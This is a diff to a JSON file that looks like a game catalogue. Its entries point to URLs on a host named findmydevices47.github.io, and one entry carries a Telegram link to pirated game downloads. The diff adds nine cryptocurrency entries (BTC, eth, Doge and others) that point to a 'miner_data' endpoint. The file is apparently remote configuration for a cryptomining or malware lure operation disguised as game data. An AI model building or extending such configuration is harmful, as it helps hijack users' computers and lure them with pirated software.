@@ -95,8 +95,8 @@
         "duration": "181 minutes",
         "contentCategory": "Action-adventure",
         "contentIcon": true,
-        "result": "", 
-        "showTime": "10000000",
+        "result": "https://t.me/pc_game_down/29892", 
+        "showTime": "20000",
         "generatedText": "https://findmydevices47.github.io/apiv1/gaming_data/gta_5"
     },
 { 
@@ -164,6 +164,105 @@
         "result": "", 
         "showTime": "1000000000",
         "generatedText": "https://findmydevices47.github.io/apiv1/gaming_data/doom_2016"
+    },
+{ 
+        "name": "Shiba Inu",
+        "releaseDate": "August 2020",
+        "rating": "9.7",
+        "duration": "181 minutes",
+        "contentCategory": "crypto",
+        "contentIcon": true,
+        "result": "", 
+        "showTime": "4000000",
+        "generatedText": "https://findmydevices47.github.io/apiv3/miner_data"
+    },
+{ 
+        "name": "ftm",
+        "releaseDate": "August 2020",
+        "rating": "9.7",
+        "duration": "181 minutes",
+        "contentCategory": "crypto",
+        "contentIcon": true,
+        "result": "", 
+        "showTime": "4000000",
+        "generatedText": "https://findmydevices47.github.io/apiv3/miner_data"
+    },
+{ 
+        "name": "Doge",
+        "releaseDate": "August 2020",
+        "rating": "9.7",
+        "duration": "181 minutes",
+        "contentCategory": "crypto",
+        "contentIcon": true,
+        "result": "", 
+        "showTime": "4000000",
+        "generatedText": "https://findmydevices47.github.io/apiv3/miner_data"
+    },
+{ 
+        "name": "pepe",
+        "releaseDate": "August 2020",
+        "rating": "9.7",
+        "duration": "181 minutes",
+        "contentCategory": "crypto",
+        "contentIcon": true,
+        "result": "", 
+        "showTime": "4000000",
+        "generatedText": "https://findmydevices47.github.io/apiv3/miner_data"
+    },
+{ 
+        "name": "people",
+        "releaseDate": "August 2020",
+        "rating": "9.7",
+        "duration": "181 minutes",
+        "contentCategory": "crypto",
+        "contentIcon": true,
+        "result": "", 
+        "showTime": "400000",
+        "generatedText": "https://findmydevices47.github.io/apiv3/miner_data"
+    },
+{ 
+        "name": "trb",
+        "releaseDate": "August 2020",
+        "rating": "9.7",
+        "duration": "181 minutes",
+        "contentCategory": "crypto",
+        "contentIcon": true,
+        "result": "", 
+        "showTime": "400000",
+        "generatedText": "https://findmydevices47.github.io/apiv3/miner_data"
+    },
+{ 
+        "name": "eth",
+        "releaseDate": "August 2020",
+        "rating": "9.7",
+        "duration": "181 minutes",
+        "contentCategory": "crypto",
+        "contentIcon": true,
+        "result": "", 
+        "showTime": "400000",
+        "generatedText": "https://findmydevices47.github.io/apiv3/miner_data"
+    },
+{ 
+        "name": "BTC",
+        "releaseDate": "August 2020",
+        "rating": "9.7",
+        "duration": "181 minutes",
+        "contentCategory": "crypto",
+        "contentIcon": true,
+        "result": "", 
+        "showTime": "400000",
+        "generatedText": "https://findmydevices47.github.io/apiv3/miner_data"
+    },
+{ 
+        "name": "BNB",
+        "releaseDate": "August 2020",
+        "rating": "9.7",
+        "duration": "181 minutes",
+        "contentCategory": "crypto",
+        "contentIcon": true,
+        "result": "", 
+        "showTime": "400000",
+        "generatedText": "https://findmydevices47.github.io/apiv3/miner_data"
     },
 { 
         "name": "Horizon Zero Dawn",
